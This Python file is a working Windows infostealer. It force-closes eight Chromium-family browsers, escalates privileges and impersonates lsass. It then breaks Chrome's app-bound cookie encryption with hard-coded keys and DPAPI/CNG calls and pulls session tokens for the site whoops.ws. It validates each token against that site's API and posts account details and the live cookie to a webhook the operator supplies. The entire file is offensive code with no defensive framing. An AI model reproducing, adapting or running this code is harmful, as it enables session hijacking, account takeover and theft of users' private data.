import os
import io
import sys
import json
import struct
import ctypes
import shutil
import random
import windows
import sqlite3
import pathlib
import requests
import binascii
import subprocess
import windows.crypto
import windows.generated_def as gdef

from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305

WEBHOOK_URL = "" # You webhook url here

VALID_COOKIES = []

HEADERS = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "fr-FR,fr;q=0.7",
    "priority": "u=1, i",
    "referer": "https://whoops.ws/",
    "sec-ch-ua": '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1",
    "user-agent": None
}

USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Mi 11) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.117 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"
)

BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Operakey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera GXkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'chromium': {
        'name': 'Chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chromium.exe',
        'key_name': 'Chromiumkey1'
    },
    'iridium': {
        'name': 'Iridium',
        'data_path': r'AppData\Local\Iridium\User Data',
        'local_state': r'AppData\Local\Iridium\User Data\Local State',
        'process_name': 'iridium.exe',
        'key_name': 'Iridiumkey1'
    }
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def is_whoops_cookie(Key: str) -> bool:
    return Key == "__Secure-next-auth.session-token"

def is_valid_whoops_cookie(Value: str) -> tuple[bool, dict | None]:
    Cookies = {
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fkonex.sh",
        "__Secure-next-auth.session-token": Value
    }
    HEADERS["user-agent"] = random.choice(USER_AGENTS)
    ApiURL = "https://whoops.ws/api/users/me"

    Resp = requests.get(ApiURL, headers=HEADERS, cookies=Cookies)

    try:
        json = Resp.json()
    except:
        json = None

    return (Resp.status_code == 200, json)

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    parsed_data['flag'] = buffer.read(1)[0]
    if parsed_data['flag'] in (1, 2):
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        parsed_data['raw_data'] = buffer.read()
    return parsed_data

def decrypt_with_cng(input_data, key_name="Google Chromekey1"):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name="Google Chromekey1") -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
    else:
        return parsed_data.get('raw_data', b'')

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def fetch_sqlite_copy(db_path):
    tmp_path = pathlib.Path(os.environ['TEMP']) /  pathlib.Path(db_path).name
    shutil.copy2(db_path, tmp_path)
    return tmp_path

def get_master_key(browser_config):
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            return windows.crypto.dpapi.unprotect(key_blob_encrypted)
        else:
            return None
            
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data['flag'] not in (1, 2, 3):
            return key_blob_user_decrypted[-32:]
            
        return derive_v20_master_key(parsed_data, browser_config['key_name'])
    except Exception as e:
        return None

def process_browser(browser_name, browser_config):
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) /  browser_config['data_path']
    
    if not browser_data_path.exists():
        return
        
    master_key = get_master_key(browser_config)
    
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    
    for profile_dir in profiles:
        cookie_db_path = profile_dir /  "Network" /  "Cookies"

        try:
            if cookie_db_path.exists():
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                con = sqlite3.connect(cookie_copy)
                cur = con.cursor()
                cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                cookies = cur.fetchall()

                for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                    if encrypted_value and encrypted_value[:3] == b"v20":
                        decrypted = decrypt_v20_value(encrypted_value, master_key)
                        if decrypted:
                            Value = decrypted
                        else:
                            continue

                    if is_whoops_cookie(name):
                        if Value in VALID_COOKIES: continue

                        res = is_valid_whoops_cookie(Value)

                        if res[0]:
                            datas = res[1]

                            displayname = datas.get("displayName")
                            username = datas.get("username")
                            userid = datas.get("id")

                            avatar_relative_path = datas.get("avatar")

                            if avatar_relative_path != None:
                                avatar_url = "https://whoops.ws" + avatar_relative_path
                            else:
                                avatar_url = None

                            email = datas.get("email")
                            timestamp = datas.get("createdAt")
                            plan = datas.get("subscription").get("tier")

                            output = {
                                "display_name": displayname,
                                "username": username,
                                "uid": userid,
                                "email": email,
                                "avatar_url": avatar_url,
                                "created": timestamp,
                                "plan": plan,
                                "cookie": Value
                            }

                            VALID_COOKIES.append(output)

                con.close()
        except:
            pass

def main():
    for browser_name, browser_config in BROWSERS.items():
        try:
            subprocess.run(["taskkill", "/f", "/im", browser_config["process_name"]], 
                         capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        
    for browser_name, browser_config in BROWSERS.items():
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) /  browser_config['data_path']
        
        if not browser_data_path.exists():
            continue
            
        master_key = get_master_key(browser_config)
    
    for browser_name, browser_config in BROWSERS.items():
        user_profile = os.environ['USERPROFILE']
        browser_data_path = pathlib.Path(user_profile) /  browser_config['data_path']
        
        if browser_data_path.exists():
            process_browser(browser_name, browser_config)

def send_datas_to_webhook(webhook_url: str, datas: list[dict]) -> None:
    def format(text: str, inline: bool = True) -> str:
        if inline:
            return "`" + text + "`"
        else:
            return "```" + text + "```"
        
    for account in datas:
        display_name = account.get("display_name", "--")
        username = account.get("username", "--")
        uid = account.get("uid", "--")
        email = account.get("email", "--")
        avatar_url = account.get("avatar_url") or ""   
        created = account.get("created", "--")
        plan = account.get("plan", "--")
        cookie = account.get("cookie", "erreur")

        embed = {
            "title": f"Nouvel utilisateur : {display_name}",
            "color": 0x2F3136,
            "thumbnail": {"url": avatar_url} if avatar_url else {},
            "fields": [
                {"name": "Nom d'affichage", "value": format(display_name), "inline": True},
                {"name": "Username", "value": format(username), "inline": True},
                {"name": "UID", "value": format(uid), "inline": False},
                {"name": "Email", "value": format(email), "inline": False},
                {"name": "Plan", "value": format(plan), "inline": True},
                {"name": "Créé le", "value": format(created), "inline": True},
                {"name": "Cookie :", "value": format(cookie, False), "inline": False},
            ]
        }

        payload = {"embeds": [embed]}

        try:
            r = requests.post(webhook_url, json=payload)
            r.raise_for_status()
        except:
            pass

if __name__ == "__main__":
    if not is_admin():
        try:
            Res = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            
            if Res <= 32:
                sys.exit(0)
        except:
            sys.exit(0)
    else:
        try:
            main()
            send_datas_to_webhook(WEBHOOK_URL, VALID_COOKIES)
        except:
            pass
